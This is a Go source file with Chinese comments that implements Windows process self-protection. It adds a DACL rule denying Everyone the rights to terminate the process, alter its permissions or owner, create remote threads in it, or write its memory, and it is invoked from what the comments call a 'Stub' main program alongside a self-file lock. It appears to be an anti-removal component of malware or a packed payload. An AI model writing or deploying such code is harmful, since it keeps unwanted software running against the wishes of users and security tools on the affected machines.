// 文件路径: internal/protect/anti_kill.go
package protect

import (
	"syscall"
	"unsafe"
)

// --- Windows API 常量与结构体精确对齐定义 ---
const (
	PROCESS_TERMINATE           = 0x0001
	PROCESS_CREATE_THREAD       = 0x0002     // 🌟 新增：防止远程线程注入 (CreateRemoteThread)
	PROCESS_VM_WRITE            = 0x0020     // 🌟 新增：防止跨进程写内存 (WriteProcessMemory)
	WRITE_DAC                   = 0x00040000 // 修改安全描述符权限
	WRITE_OWNER                 = 0x00080000 // 修改所有者权限
	DACL_SECURITY_INFORMATION   = 0x00000004
	SE_KERNEL_OBJECT            = 6 // SE_OBJECT_TYPE
	DENY_ACCESS                 = 3 // ACCESS_MODE
	NO_INHERITANCE              = 0x0
	TRUSTEE_IS_SID              = 0
	TRUSTEE_IS_WELL_KNOWN_GROUP = 5
	ERROR_SUCCESS               = 0
	PROCESS_ALL_ACCESS          = 0x1FFFFF
)

// TRUSTEE_W 结构体
type TRUSTEE_W struct {
	pMultipleTrustee         uintptr
	MultipleTrusteeOperation uint32
	TrusteeForm              uint32
	TrusteeType              uint32
	ptstrName                uintptr // 指向 SID 或 字符串指针
}

// EXPLICIT_ACCESS_W 结构体
type EXPLICIT_ACCESS_W struct {
	grfAccessPermissions uint32
	grfAccessMode        uint32
	grfInheritance       uint32
	Trustee              TRUSTEE_W
}

var (
	advapi32                     = syscall.NewLazyDLL("advapi32.dll")
	procGetSecurityInfo          = advapi32.NewProc("GetSecurityInfo")
	procSetSecurityInfo          = advapi32.NewProc("SetSecurityInfo")
	procSetEntriesInAclW         = advapi32.NewProc("SetEntriesInAclW")
	procAllocateAndInitializeSid = advapi32.NewProc("AllocateAndInitializeSid")
	procFreeSid                  = advapi32.NewProc("FreeSid")

	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess              = kernel32.NewProc("OpenProcess")
)

// ProtectProcessByHandle 为指定的任意进程句柄剥夺被结束和修改权限的资格
func ProtectProcessByHandle(handle syscall.Handle) {
	var pOldDacl uintptr
	var pSD uintptr

	// 1. 获取目标进程的安全描述符
	ret, _, _ := procGetSecurityInfo.Call(
		uintptr(handle),
		uintptr(SE_KERNEL_OBJECT),
		uintptr(DACL_SECURITY_INFORMATION),
		0, 0,
		uintptr(unsafe.Pointer(&pOldDacl)),
		0,
		uintptr(unsafe.Pointer(&pSD)),
	)
	if ret != ERROR_SUCCESS {
		return
	}
	defer syscall.LocalFree(syscall.Handle(pSD))

	// 2. 初始化 Everyone 的 SID
	var pEveryoneSid uintptr
	var SIDAuthWorld = [6]byte{0, 0, 0, 0, 0, 1}

	ret, _, _ = procAllocateAndInitializeSid.Call(
		uintptr(unsafe.Pointer(&SIDAuthWorld)),
		1, 0, 0, 0, 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&pEveryoneSid)),
	)
	if ret == 0 {
		return
	}
	defer procFreeSid.Call(pEveryoneSid)

	// 3. 构造显式访问规则
	var ea EXPLICIT_ACCESS_W
	// 🌟 终极修复：同时剥夺 "结束进程"、"修改安全权限"、"修改所有者"、"创建远程线程" 和 "写入虚拟内存" 的权限
	// 彻底封死任务管理器以及常规内存注入工具的干涉能力
	ea.grfAccessPermissions = PROCESS_TERMINATE | WRITE_DAC | WRITE_OWNER | PROCESS_CREATE_THREAD | PROCESS_VM_WRITE
	ea.grfAccessMode = DENY_ACCESS
	ea.grfInheritance = NO_INHERITANCE
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP
	ea.Trustee.ptstrName = pEveryoneSid

	// 4. 合并并生成新的 DACL
	var pNewDacl uintptr
	ret, _, _ = procSetEntriesInAclW.Call(
		1,
		uintptr(unsafe.Pointer(&ea)),
		pOldDacl,
		uintptr(unsafe.Pointer(&pNewDacl)),
	)
	if ret == ERROR_SUCCESS && pNewDacl != 0 {
		defer syscall.LocalFree(syscall.Handle(pNewDacl))

		// 5. 将新 DACL 写入目标进程
		procSetSecurityInfo.Call(
			uintptr(handle),
			uintptr(SE_KERNEL_OBJECT),
			uintptr(DACL_SECURITY_INFORMATION),
			0, 0, pNewDacl, 0,
		)
	}
}

// ProtectProcess 剥夺系统强制结束当前父进程的权限
func ProtectProcess() {
	// 🌟 修复：不再使用会静默失效的伪句柄 GetCurrentProcess()，
	// 而是通过 PID 获取具备完整权限的真实句柄进行操作
	pid := syscall.Getpid()
	handle, _, _ := procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	if handle != 0 {
		ProtectProcessByHandle(syscall.Handle(handle))
		syscall.CloseHandle(syscall.Handle(handle))
	}
}

// EnableProtection 一键开启全局防御 (供 Stub 主程序调用)
func EnableProtection() {
	go LockSelfFile()
	go ProtectProcess()
}
